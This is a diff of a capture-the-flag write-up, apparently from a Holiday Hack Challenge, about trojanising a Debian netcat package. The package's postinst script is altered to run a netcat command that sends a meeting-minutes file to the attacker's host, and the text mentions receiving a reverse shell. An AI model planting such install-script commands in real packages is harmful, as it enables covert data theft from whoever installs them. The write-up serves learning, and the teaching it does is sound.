@@ -29,6 +29,7 @@ A Node.js HTTP server was started using  `python3 -m http.server 80` and it logg
 
 On the device the Debian package `netcat-traditional_1.10-41.1ubuntu1_amd64.deb` was found.
 This package was modified to include a netcat command in the postinst script to send the text file to our local host:
+
 `/bin/nc 10.6.0.2 4444 < /NORTH_POLE_Land_Use_Board_Meeting_Minutes.txt`
 
 By opting for 
@@ -51,7 +52,7 @@ That way the remote device would download this package and install it. In course
 to receive the [text](https://github.com/joergschwarzwaelder/hhc2020/blob/master/Objective-9/NORTH_POLE_Land_Use_Board_Meeting_Minutes.txt) (resp. receive the reverse shell connection).
 In this file it can be found that **Tanta Kringle** recused herself from the vote.
 <!--stackedit_data:
-eyJoaXN0b3J5IjpbMjAxOTg4Mjk1NywxMjcyNjU2NDE5LDg1OD
+eyJoaXN0b3J5IjpbLTc5NTY0ODQ1MywxMjcyNjU2NDE5LDg1OD
 E4ODkyOSwxMDkyNzg1MzIxLC0yMDYyNjc1Mjk3LC02MTI4OTc3
 OTksLTg1MjcyMjcwMywxNzU4MjQzNjc3LDE2MzQzOTQ5NDEsMT
 IwNDQyNjUzOSwtMTc5ODQxNTg5NiwtODc4MzkyMjE2LDUxNDIw
